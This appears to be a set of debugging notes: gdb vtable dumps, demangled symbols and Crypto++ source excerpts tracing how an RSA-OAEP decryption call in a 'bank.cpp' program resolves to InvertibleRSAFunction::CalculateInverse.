0x7ffff7dc3100 <_ZTIN8CryptoPP21InvertibleRSAFunctionE>:        0x0063f210
(gdb) x/w 0x000000000042b500
0x42b500 <_ZThn104_N8CryptoPP21InvertibleRSAFunctionD1Ev>:      0xe5894855
(gdb) x/w 0x00007ffff7a8f590
0x7ffff7a8f590 <_ZThn104_N8CryptoPP21InvertibleRSAFunctionD0Ev>:        0x68ef8348
(gdb) x/w 0x000000000042ba20
0x42ba20 <_ZNK8CryptoPP23TrapdoorFunctionInverse26CalculateRandomizedInverseERNS_21RandomNumberGeneratorERKNS_7IntegerE>:       0xe5894855
(gdb) x/w 0x000000000042ba80
0x42ba80 <_ZNK8CryptoPP23TrapdoorFunctionInverse12IsRandomizedEv>:      0xe5894855
(gdb) x/w 0x00007ffff7a8dc80
0x7ffff7a8dc80 <_ZThn104_NK8CryptoPP21InvertibleRSAFunction16CalculateInverseERNS_21RandomNumberGeneratorERKNS_7IntegerE>:      0x68ee8348
(gdb) x/w 0x00007ffff7dc3100
0x7ffff7dc3100 <_ZTIN8CryptoPP21InvertibleRSAFunctionE>:        0x0063f210
(gdb) x/w 0x000000000042b530
0x42b530 <_ZThn112_N8CryptoPP21InvertibleRSAFunctionD1Ev>:      0xe5894855
(gdb) x/w 0x00007ffff7a8f580
0x7ffff7a8f580 <_ZThn112_N8CryptoPP21InvertibleRSAFunctionD0Ev>:        0x70ef8348
(gdb) x/w 0x00007ffff7a8e130
0x7ffff7a8e130 <_ZThn112_N8CryptoPP21InvertibleRSAFunction9BERDecodeERNS_22BufferedTransformationE>:    0x70ef8348
(gdb) x/w 0x00007ffff7a8e1a0
0x7ffff7a8e1a0 <_ZThn112_NK8CryptoPP21InvertibleRSAFunction9DEREncodeERNS_22BufferedTransformationE>:   0x70ef8348
(gdb) x/w 0x00000000004289f0
0x4289f0 <_ZNK8CryptoPP10ASN1Object9BEREncodeERNS_22BufferedTransformationE>:   0xe5894855
(gdb) x/w 0x00007ffff7a8e170
0x7ffff7a8e170 <_ZThn112_NK8CryptoPP21InvertibleRSAFunction4SaveERNS_22BufferedTransformationE>:        0x70ef8348
(gdb) x/w 0x00007ffff7a8e100
0x7ffff7a8e100 <_ZThn112_N8CryptoPP21InvertibleRSAFunction4LoadERNS_22BufferedTransformationE>: 0x70ef8348
(gdb) x/w 0x00007ffff7a8f030
0x7ffff7a8f030 <_ZThn112_NK8CryptoPP21InvertibleRSAFunction14GetAlgorithmIDEv>: 0x70ee8348
(gdb) x/w 0x00007ffff7990bf0
0x7ffff7990bf0 <_ZN8CryptoPP15PKCS8PrivateKey28BERDecodeAlgorithmParametersERNS_22BufferedTransformationE>:    0x08ec8348
(gdb) x/w 0x00007ffff7990bb0
0x7ffff7990bb0 <_ZNK8CryptoPP15PKCS8PrivateKey28DEREncodeAlgorithmParametersERNS_22BufferedTransformationE>:   0x08ec8348
(gdb) x/w 0x00007ffff7a8acd0
0x7ffff7a8acd0 <_ZThn112_N8CryptoPP21InvertibleRSAFunction19BERDecodePrivateKeyERNS_22BufferedTransformationEbm>:       0x70ef8348
(gdb) x/w 0x00007ffff7a8add0
0x7ffff7a8add0 <_ZThn112_NK8CryptoPP21InvertibleRSAFunction19DEREncodePrivateKeyERNS_22BufferedTransformationE>:
        0x70ef8348
(gdb) x/w 0x00007ffff798f230
0x7ffff798f230 <_ZN8CryptoPP15PKCS8PrivateKey27BERDecodeOptionalAttributesERNS_22BufferedTransformationE>:     0x48f08948
(gdb) x/w 0x00007ffff798db30
0x7ffff798db30 <_ZNK8CryptoPP15PKCS8PrivateKey27DEREncodeOptionalAttributesERNS_22BufferedTransformationE>:    0x48f88948
(gdb) x/w 0x00007ffff7dc3100
0x7ffff7dc3100 <_ZTIN8CryptoPP21InvertibleRSAFunctionE>:        0x0063f210
(gdb) x/w 0x000000000042b560
0x42b560 <_ZThn120_N8CryptoPP21InvertibleRSAFunctionD1Ev>:      0xe5894855
(gdb) x/w 0x00007ffff7a8f570
0x7ffff7a8f570 <_ZThn120_N8CryptoPP21InvertibleRSAFunctionD0Ev>:        0x78ef8348
(gdb) x/w 0x00007ffff7a8ca90
0x7ffff7a8ca90 <_ZThn120_N8CryptoPP21InvertibleRSAFunction14GenerateRandomERNS_21RandomNumberGeneratorERKNS_14NameValuePairsE>: 0x78ef8348
(gdb) 
-----
:!grep '^0x' | awk '{print $2}'
:normal 0xf>D
:!c++filt
-----
typeinfo for CryptoPP::InvertibleRSAFunction
CryptoPP::InvertibleRSAFunction::~InvertibleRSAFunction()
CryptoPP::InvertibleRSAFunction::~InvertibleRSAFunction()
CryptoPP::RSAFunction::PreimageBound() const
CryptoPP::RSAFunction::ImageBound() const
CryptoPP::TrapdoorFunctionBounds::MaxPreimage() const
CryptoPP::TrapdoorFunctionBounds::MaxImage() const
CryptoPP::TrapdoorFunction::ApplyRandomizedFunction(CryptoPP::RandomNumberGenerator&, CryptoPP::Integer const&) const
CryptoPP::TrapdoorFunction::IsRandomized() const
CryptoPP::RSAFunction::ApplyFunction(CryptoPP::Integer const&) const
CryptoPP::InvertibleRSAFunction::GetAlgorithmID() const
CryptoPP::RSAFunction::BERDecodePublicKey(CryptoPP::BufferedTransformation&, bool, unsigned long)
CryptoPP::RSAFunction::DEREncodePublicKey(CryptoPP::BufferedTransformation&) const
CryptoPP::InvertibleRSAFunction::Validate(CryptoPP::RandomNumberGenerator&, unsigned int) const
CryptoPP::InvertibleRSAFunction::GetVoidValue(char const*, std::type_info const&, void*) const
CryptoPP::InvertibleRSAFunction::AssignFrom(CryptoPP::NameValuePairs const&)
CryptoPP::InvertibleRSAFunction::BERDecode(CryptoPP::BufferedTransformation&)
CryptoPP::InvertibleRSAFunction::DEREncode(CryptoPP::BufferedTransformation&) const
CryptoPP::InvertibleRSAFunction::Load(CryptoPP::BufferedTransformation&)
CryptoPP::InvertibleRSAFunction::Save(CryptoPP::BufferedTransformation&) const
CryptoPP::InvertibleRSAFunction::BERDecodePrivateKey(CryptoPP::BufferedTransformation&, bool, unsigned long)
CryptoPP::InvertibleRSAFunction::DEREncodePrivateKey(CryptoPP::BufferedTransformation&) const
CryptoPP::InvertibleRSAFunction::CalculateInverse(CryptoPP::RandomNumberGenerator&, CryptoPP::Integer const&) const
CryptoPP::InvertibleRSAFunction::GenerateRandom(CryptoPP::RandomNumberGenerator&, CryptoPP::NameValuePairs const&)
typeinfo for CryptoPP::InvertibleRSAFunction
non-virtual thunk to CryptoPP::InvertibleRSAFunction::~InvertibleRSAFunction()
non-virtual thunk to CryptoPP::InvertibleRSAFunction::~InvertibleRSAFunction()
non-virtual thunk to CryptoPP::InvertibleRSAFunction::BERDecode(CryptoPP::BufferedTransformation&)
non-virtual thunk to CryptoPP::InvertibleRSAFunction::DEREncode(CryptoPP::BufferedTransformation&) const
CryptoPP::ASN1Object::BEREncode(CryptoPP::BufferedTransformation&) const
non-virtual thunk to CryptoPP::InvertibleRSAFunction::Save(CryptoPP::BufferedTransformation&) const
non-virtual thunk to CryptoPP::InvertibleRSAFunction::Load(CryptoPP::BufferedTransformation&)
non-virtual thunk to CryptoPP::InvertibleRSAFunction::GetAlgorithmID() const
CryptoPP::X509PublicKey::BERDecodeAlgorithmParameters(CryptoPP::BufferedTransformation&)
CryptoPP::X509PublicKey::DEREncodeAlgorithmParameters(CryptoPP::BufferedTransformation&) const
non-virtual thunk to CryptoPP::RSAFunction::BERDecodePublicKey(CryptoPP::BufferedTransformation&, bool, unsigned long)
non-virtual thunk to CryptoPP::RSAFunction::DEREncodePublicKey(CryptoPP::BufferedTransformation&) const
typeinfo for CryptoPP::InvertibleRSAFunction
non-virtual thunk to CryptoPP::InvertibleRSAFunction::~InvertibleRSAFunction()
non-virtual thunk to CryptoPP::InvertibleRSAFunction::~InvertibleRSAFunction()
virtual thunk to CryptoPP::InvertibleRSAFunction::GetVoidValue(char const*, std::type_info const&, void*) const
virtual thunk to CryptoPP::InvertibleRSAFunction::AssignFrom(CryptoPP::NameValuePairs const&)
virtual thunk to CryptoPP::InvertibleRSAFunction::Validate(CryptoPP::RandomNumberGenerator&, unsigned int) const
CryptoPP::CryptoMaterial::ThrowIfInvalid(CryptoPP::RandomNumberGenerator&, unsigned int) const
virtual thunk to CryptoPP::InvertibleRSAFunction::Save(CryptoPP::BufferedTransformation&) const
virtual thunk to CryptoPP::InvertibleRSAFunction::Load(CryptoPP::BufferedTransformation&)
CryptoPP::CryptoMaterial::SupportsPrecomputation() const
CryptoPP::CryptoMaterial::Precompute(unsigned int)
CryptoPP::CryptoMaterial::LoadPrecomputation(CryptoPP::BufferedTransformation&)
CryptoPP::CryptoMaterial::SavePrecomputation(CryptoPP::BufferedTransformation&) const
typeinfo for CryptoPP::InvertibleRSAFunction
non-virtual thunk to CryptoPP::InvertibleRSAFunction::~InvertibleRSAFunction()
non-virtual thunk to CryptoPP::InvertibleRSAFunction::~InvertibleRSAFunction()
CryptoPP::TrapdoorFunctionInverse::CalculateRandomizedInverse(CryptoPP::RandomNumberGenerator&, CryptoPP::Integer const&) const
CryptoPP::TrapdoorFunctionInverse::IsRandomized() const
non-virtual thunk to CryptoPP::InvertibleRSAFunction::CalculateInverse(CryptoPP::RandomNumberGenerator&, CryptoPP::Integer const&) const
typeinfo for CryptoPP::InvertibleRSAFunction
non-virtual thunk to CryptoPP::InvertibleRSAFunction::~InvertibleRSAFunction()
non-virtual thunk to CryptoPP::InvertibleRSAFunction::~InvertibleRSAFunction()
non-virtual thunk to CryptoPP::InvertibleRSAFunction::BERDecode(CryptoPP::BufferedTransformation&)
non-virtual thunk to CryptoPP::InvertibleRSAFunction::DEREncode(CryptoPP::BufferedTransformation&) const
CryptoPP::ASN1Object::BEREncode(CryptoPP::BufferedTransformation&) const
non-virtual thunk to CryptoPP::InvertibleRSAFunction::Save(CryptoPP::BufferedTransformation&) const
non-virtual thunk to CryptoPP::InvertibleRSAFunction::Load(CryptoPP::BufferedTransformation&)
non-virtual thunk to CryptoPP::InvertibleRSAFunction::GetAlgorithmID() const
CryptoPP::PKCS8PrivateKey::BERDecodeAlgorithmParameters(CryptoPP::BufferedTransformation&)
CryptoPP::PKCS8PrivateKey::DEREncodeAlgorithmParameters(CryptoPP::BufferedTransformation&) const
non-virtual thunk to CryptoPP::InvertibleRSAFunction::BERDecodePrivateKey(CryptoPP::BufferedTransformation&, bool, unsigned long)
non-virtual thunk to CryptoPP::InvertibleRSAFunction::DEREncodePrivateKey(CryptoPP::BufferedTransformation&) const
CryptoPP::PKCS8PrivateKey::BERDecodeOptionalAttributes(CryptoPP::BufferedTransformation&)
CryptoPP::PKCS8PrivateKey::DEREncodeOptionalAttributes(CryptoPP::BufferedTransformation&) const
typeinfo for CryptoPP::InvertibleRSAFunction
non-virtual thunk to CryptoPP::InvertibleRSAFunction::~InvertibleRSAFunction()
non-virtual thunk to CryptoPP::InvertibleRSAFunction::~InvertibleRSAFunction()
non-virtual thunk to CryptoPP::InvertibleRSAFunction::GenerateRandom(CryptoPP::RandomNumberGenerator&, CryptoPP::NameValuePairs const&)
-----
bank.cpp
---
  CryptoPP::RSAES_OAEP_SHA_Decryptor d2(privateKey);
  CryptoPP::StringSource ss2(cipher2, true,
      new CryptoPP::PK_DecryptorFilter(rng, d2,
          new CryptoPP::StringSink(recovered_iv)
     )
  );
---
filters.h
---
class CRYPTOPP_DLL PK_DecryptorFilter : public SimpleProxyFilter
{
public:
    PK_DecryptorFilter(RandomNumberGenerator &rng, const PK_Decryptor &decryptor, BufferedTransformation *attachment = NULL)
        : SimpleProxyFilter(decryptor.CreateDecryptionFilter(rng), attachment) {}
};
---
cryptlib.cpp
---
BufferedTransformation * PK_Decryptor::CreateDecryptionFilter(RandomNumberGenerator &rng, BufferedTransformation *attachment, const NameValuePairs &parameters) const
{
    return new PK_DefaultDecryptionFilter(rng, *this, attachment, parameters);
}
---
class PK_DefaultDecryptionFilter : public Unflushable<Filter>
{
public:
    PK_DefaultDecryptionFilter(RandomNumberGenerator &rng, const PK_Decryptor &decryptor, BufferedTransformation *attachment, const NameValuePairs &parameters)
        : m_rng(rng), m_decryptor(decryptor), m_parameters(parameters)
    {  
        Detach(attachment);
    }

    size_t Put2(const byte *inString, size_t length, int messageEnd, bool blocking)
    {  
        FILTER_BEGIN;
        m_ciphertextQueue.Put(inString, length);

        if (messageEnd)
        {  
            {
            size_t ciphertextLength;
            if (!SafeConvert(m_ciphertextQueue.CurrentSize(), ciphertextLength))
                throw InvalidArgument("PK_DefaultDecryptionFilter: ciphertext too long");
            size_t maxPlaintextLength = m_decryptor.MaxPlaintextLength(ciphertextLength);

            SecByteBlock ciphertext(ciphertextLength);
            m_ciphertextQueue.Get(ciphertext, ciphertextLength);
            m_plaintext.resize(maxPlaintextLength);
            m_result = m_decryptor.Decrypt(m_rng, ciphertext, ciphertextLength, m_plaintext, m_parameters);
            if (!m_result.isValidCoding)
                throw InvalidCiphertext(m_decryptor.AlgorithmName() + ": invalid ciphertext");
            }

            FILTER_OUTPUT(1, m_plaintext, m_result.messageLength, messageEnd);
        }
        FILTER_END_NO_MESSAGE_END;
    }

    RandomNumberGenerator &m_rng;
    const PK_Decryptor &m_decryptor;
    const NameValuePairs &m_parameters;
    ByteQueue m_ciphertextQueue;
    SecByteBlock m_plaintext;
    DecodingResult m_result;
};
---
PK_DecryptorFilter::PK_DecryptorFilter ->
PK_DecryptorFilter::CreateDecryptionFilter ->
PK_DefaultDecryptionFilter::PK_DefaultDecryptionFilter ->
PK_Decryptor::Decrypt
-----
rsa.h
---
typedef RSAES<OAEP<SHA> >::Decryptor RSAES_OAEP_SHA_Decryptor;
---
template <class STANDARD>
struct RSAES : public TF_ES<STANDARD, RSA>
{
};
---
struct CRYPTOPP_DLL RSA
{
    static const char * CRYPTOPP_API StaticAlgorithmName() {return "RSA";}
    typedef RSAFunction PublicKey;
    typedef InvertibleRSAFunction PrivateKey;
};
---
pubkey.{h,cpp}
---
//! Trapdoor Function Based Encryption Scheme
template <class STANDARD, class KEYS, class ALG_INFO = TF_ES<STANDARD, KEYS, int> >
class TF_ES : public KEYS
{
    typedef typename STANDARD::EncryptionMessageEncodingMethod MessageEncodingMethod;

public:
    //! see EncryptionStandard for a list of standards
    typedef STANDARD Standard;
    typedef TF_CryptoSchemeOptions<ALG_INFO, KEYS, MessageEncodingMethod> SchemeOptions;

    static std::string CRYPTOPP_API StaticAlgorithmName() {return std::string(KEYS::StaticAlgorithmName()) + "/" + MessageEncodingMethod::StaticAlgorithmName();}

    //! implements PK_Decryptor interface
    typedef PK_FinalTemplate<TF_DecryptorImpl<SchemeOptions> > Decryptor;
    //! implements PK_Encryptor interface
    typedef PK_FinalTemplate<TF_EncryptorImpl<SchemeOptions> > Encryptor;
};
---
template <class T1, class T2, class T3>
struct TF_CryptoSchemeOptions
{
    typedef T1 AlgorithmInfo;
    typedef T2 Keys;
    typedef typename Keys::PrivateKey PrivateKey;
    typedef typename Keys::PublicKey PublicKey;
    typedef T3 MessageEncodingMethod;
};
---
//! A template implementing constructors for public key algorithm classes
template <class BASE>
class CRYPTOPP_NO_VTABLE PK_FinalTemplate : public BASE
{
/* innards elided */
};
---
template <class SCHEME_OPTIONS>
class TF_DecryptorImpl : public TF_ObjectImpl<TF_DecryptorBase, SCHEME_OPTIONS, typename SCHEME_OPTIONS::PrivateKey>
{
};
---
template <class BASE, class SCHEME_OPTIONS, class KEY_CLASS>
class CRYPTOPP_NO_VTABLE TF_ObjectImpl : public TF_ObjectImplBase<BASE, SCHEME_OPTIONS, KEY_CLASS>
{
public:
    typedef KEY_CLASS KeyClass;

    const KeyClass & GetKey() const {return m_trapdoorFunction;}
    KeyClass & AccessKey() {return m_trapdoorFunction;}

#ifndef CRYPTOPP_MAINTAIN_BACKWARDS_COMPATIBILITY_562
    virtual ~TF_ObjectImpl() { }
#endif

private:
    KeyClass m_trapdoorFunction;
};
---
class CRYPTOPP_DLL CRYPTOPP_NO_VTABLE TF_DecryptorBase : public TF_CryptoSystemBase<PK_Decryptor, TF_Base<TrapdoorFunctionInverse, PK_EncryptionMessageEncodingMethod> >
{
public:
    DecodingResult Decrypt(RandomNumberGenerator &rng, const byte *ciphertext, size_t ciphertextLength, byte *plaintext, const NameValuePairs &parameters = g_nullNameValuePairs) const;

#ifndef CRYPTOPP_MAINTAIN_BACKWARDS_COMPATIBILITY_562
    virtual ~TF_DecryptorBase() { }
#endif
};
---
DecodingResult TF_DecryptorBase::Decrypt(RandomNumberGenerator &rng, const byte *ciphertext, size_t ciphertextLength, byte *plaintext, const NameValuePairs &parameters) const
{
    if (ciphertextLength != FixedCiphertextLength())
            throw InvalidArgument(AlgorithmName() + ": ciphertext length of " + IntToString(ciphertextLength) + " doesn't match the required length of " + IntToString(FixedCiphertextLength()) + " for this key");

    SecByteBlock paddedBlock(PaddedBlockByteLength());
    Integer x = GetTrapdoorFunctionInterface().CalculateInverse(rng, Integer(ciphertext, ciphertextLength));
    if (x.ByteCount() > paddedBlock.size())
        x = Integer::Zero();    // don't return false here to prevent timing attack
    x.Encode(paddedBlock, paddedBlock.size());
    return GetMessageEncodingInterface().Unpad(paddedBlock, PaddedBlockBitLength(), plaintext, parameters);
}
---
template <class BASE, class SCHEME_OPTIONS, class KEY_CLASS>
class CRYPTOPP_NO_VTABLE TF_ObjectImplBase : public AlgorithmImpl<BASE, typename SCHEME_OPTIONS::AlgorithmInfo>
{
public:
    typedef SCHEME_OPTIONS SchemeOptions;
    typedef KEY_CLASS KeyClass;

    PublicKey & AccessPublicKey() {return AccessKey();}
    const PublicKey & GetPublicKey() const {return GetKey();}

    PrivateKey & AccessPrivateKey() {return AccessKey();}
    const PrivateKey & GetPrivateKey() const {return GetKey();}

    virtual const KeyClass & GetKey() const =0;
    virtual KeyClass & AccessKey() =0;

    const KeyClass & GetTrapdoorFunction() const {return GetKey();}

    PK_MessageAccumulator * NewSignatureAccumulator(RandomNumberGenerator &rng) const
    {
        CRYPTOPP_UNUSED(rng);
        return new PK_MessageAccumulatorImpl<CPP_TYPENAME SCHEME_OPTIONS::HashFunction>;
    }
    PK_MessageAccumulator * NewVerificationAccumulator() const
    {
        return new PK_MessageAccumulatorImpl<CPP_TYPENAME SCHEME_OPTIONS::HashFunction>;
    }

#ifndef CRYPTOPP_MAINTAIN_BACKWARDS_COMPATIBILITY_562
    virtual ~TF_ObjectImplBase() { }
#endif

protected:
    const typename BASE::MessageEncodingInterface & GetMessageEncodingInterface() const
        {return Singleton<CPP_TYPENAME SCHEME_OPTIONS::MessageEncodingMethod>().Ref();}
    const TrapdoorFunctionBounds & GetTrapdoorFunctionBounds() const
        {return GetKey();}
    const typename BASE::TrapdoorFunctionInterface & GetTrapdoorFunctionInterface() const
        {return GetKey();}

    // for signature scheme
    HashIdentifier GetHashIdentifier() const
    {
        typedef CPP_TYPENAME SchemeOptions::MessageEncodingMethod::HashIdentifierLookup::template HashIdentifierLookup2<CPP_TYPENAME SchemeOptions::HashFunction> L;
        return L::Lookup();
    }
    size_t GetDigestSize() const
    {
        typedef CPP_TYPENAME SchemeOptions::HashFunction H;
        return H::DIGESTSIZE;
    }
};
---
factory.h
---
template <class SchemeClass>
void RegisterAsymmetricCipherDefaultFactories(const char *name=NULL, SchemeClass *dummy=NULL)
{
    CRYPTOPP_UNUSED(dummy);
    RegisterDefaultFactoryFor<PK_Encryptor, CPP_TYPENAME SchemeClass::Encryptor>((const char *)name);
    RegisterDefaultFactoryFor<PK_Decryptor, CPP_TYPENAME SchemeClass::Decryptor>((const char *)name);
}
---
TF_DecryptorBase::Decrypt() ->
TF_ObjectImplBase::GetTrapdoorFunctionInterface() ->
TF_ObjectImpl::GetKey() ->
TF_ObjectImpl::KeyClass m_trapdoorFunction ->
TF_DecryptorImpl::SCHEME_OPTIONS::PrivateKey m_trapdoorFunction ->
TF_ES::SchemeOptions::PrivateKey m_trapdoorFunction ->
TF_CryptoSchemeOptions::Keys::PrivateKey m_trapdoorFunction ->
RSA::InvertibleRSAFunction m_trapdoorFunction
---
Integer x = GetTrapdoorFunctionInterface().CalculateInverse(rng, Integer(ciphertext, ciphertextLength));
---
(gdb) x/gx &_ZTVN8CryptoPP21InvertibleRSAFunctionE+48
0x63df60 <_ZTVN8CryptoPP21InvertibleRSAFunctionE+192>:  0x00007ffff7a8d7b0
(gdb) x/gx 0x00007ffff7a8d7b0
0x7ffff7a8d7b0 <_ZNK8CryptoPP21InvertibleRSAFunction16CalculateInverseERNS_21RandomNumberGeneratorERKNS_7IntegerE>:     0x5441554156415741
-----
